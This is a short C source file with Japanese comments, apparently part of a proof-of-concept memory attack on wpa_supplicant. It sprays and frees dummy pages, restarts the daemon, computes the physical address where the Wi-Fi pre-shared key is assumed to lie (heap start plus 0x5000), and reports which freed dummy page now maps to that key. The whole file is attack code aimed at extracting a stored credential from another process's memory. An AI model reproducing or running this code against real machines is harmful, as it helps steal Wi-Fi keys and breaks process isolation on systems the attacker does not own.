#include "wpa.h"
#include "utils.h"
#include <sched.h>
#include <fcntl.h>
#include <unistd.h>

const int DUMMY_PAGE = 300;
const int BUSY_LOOP = 5;

// psk の heap 領域からのオフセットは 0x5000 の場合が多い
const int OFFSET = 0x5000;

int main() {
    int i;

    // ダミーページ確保
    address dummy_pages[DUMMY_PAGE];
    for (i = 0; i < DUMMY_PAGE; i++) {
        dummy_pages[i].virt_addr = mmap_custom();
        if (dummy_pages[i].virt_addr == MAP_FAILED) continue;
        dummy_pages[i].phys_addr = v2p(0, dummy_pages[i].virt_addr);
    }

    // wpa_supplicant が起動中なら一度止める
    if (get_process_id()) {
        if (kill_wpa_supplicant()) {
            err_exit("[-] failed to kill wpa_supplicant");
        }
    }

    // 他のプロセスに CPU を譲る
    for (i = 0; i < 10; i++) {
        sched_yield();
    }

    // ダミーページ解放
    for (i = 0; i < DUMMY_PAGE; i++) {
        munmap(dummy_pages[i].virt_addr, 0x1000);
    }

    // wpa_supplicant 起動
    if (start_wpa_supplicant()) {
        err_exit("[-] failed to start wpa_supplicant");
    }
    puts("[+] start wpa_supplicant");

    // wpa_supplicant が秘密情報を配置するまで待機
    busy_loop(BUSY_LOOP);

    // wpa_supplicant のプロセスID取得
    int pid = get_process_id();
    printf("[+] PID of wpa_supplicant: %d\n", pid);

    // wpa_supplicant プロセスの heap 領域のアドレスを取得
    uint64_t heap_addr = get_heap_start_address(pid);
    printf("[+] heap address = 0x%lx\n", heap_addr);

    uint64_t psk_addr = heap_addr + OFFSET;
    printf("[+] psk address = 0x%lx\n", psk_addr);

    // 物理アドレス計算
    uint64_t phys_addr = v2p(pid, (void *)psk_addr);
    printf("[+] physical address = 0x%lx\n", phys_addr);

    // ダミーページ計算
    for (int index = 0; index < DUMMY_PAGE; index++) {
        if (dummy_pages[index].phys_addr == phys_addr) {
            printf("[+] dummy page is %d\n", DUMMY_PAGE - index - 1);
            return 0;
        }
    }

    puts("[-] failed to calculate dummy page");
    return 1;
}

